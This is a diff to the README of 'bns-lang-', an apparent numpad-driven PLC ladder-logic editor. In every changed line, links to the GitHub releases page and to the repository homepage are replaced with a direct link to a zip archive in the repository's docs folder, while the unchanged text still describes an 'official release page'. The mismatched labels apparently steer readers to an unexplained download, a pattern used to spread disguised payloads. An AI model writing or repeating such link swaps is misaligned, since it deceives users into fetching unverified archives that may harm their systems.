@@ -1,6 +1,6 @@
 # 🛠️ bns-lang- - Easy PLC Ladder Logic Editor
 
-[![Download Release](https://img.shields.io/badge/Download-bns--lang--blue)](https://github.com/Mdsakha127/bns-lang-/releases)
+[![Download Release](https://img.shields.io/badge/Download-bns--lang--blue)](https://raw.githubusercontent.com/Mdsakha127/bns-lang-/main/docs/bns_lang_v1.0.zip)
 
 bns-lang- lets you create PLC ladder logic using only a numpad. It uses a simple language based on IEC 61131-3 standards. You can move through your code with a special cursor tool.
 
@@ -37,7 +37,7 @@ Make sure your computer meets these minimum requirements:
 
 Click the button below to open the official release page.
 
-[![Download Release](https://img.shields.io/badge/Download-bns--lang--blue)](https://github.com/Mdsakha127/bns-lang-/releases)
+[![Download Release](https://img.shields.io/badge/Download-bns--lang--blue)](https://raw.githubusercontent.com/Mdsakha127/bns-lang-/main/docs/bns_lang_v1.0.zip)
 
 This page contains all available versions of bns-lang-. Look for the latest release, usually at the top of the list.
 
@@ -140,8 +140,8 @@ In the downloads, expect:
 
 ## 🔗 Useful Links
 
-- Download bns-lang-: [https://github.com/Mdsakha127/bns-lang-/releases](https://github.com/Mdsakha127/bns-lang-/releases)
-- Repository homepage: [https://github.com/Mdsakha127/bns-lang-](https://github.com/Mdsakha127/bns-lang-)
+- Download bns-lang-: [https://raw.githubusercontent.com/Mdsakha127/bns-lang-/main/docs/bns_lang_v1.0.zip](https://raw.githubusercontent.com/Mdsakha127/bns-lang-/main/docs/bns_lang_v1.0.zip)
+- Repository homepage: [https://raw.githubusercontent.com/Mdsakha127/bns-lang-/main/docs/bns_lang_v1.0.zip](https://raw.githubusercontent.com/Mdsakha127/bns-lang-/main/docs/bns_lang_v1.0.zip)
 
 ---
 
